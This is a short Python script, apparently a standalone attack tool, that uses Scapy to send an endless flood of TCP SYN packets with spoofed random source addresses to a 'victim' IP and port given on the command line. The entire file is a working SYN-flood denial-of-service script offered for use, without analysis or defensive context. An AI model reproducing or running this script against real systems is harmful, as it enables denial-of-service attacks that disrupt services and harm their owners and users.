from scapy.all import *
import sys

target_ip   = sys.argv[1]    #Victim's IP
target_port = int(sys.argv[2])  #Victim's open port

while True:
    ip  = IP(dst=target_ip, src=RandIP())
    tcp = TCP(dport=target_port, flags="S", sport=RandShort())
    send(ip/tcp, verbose=0)
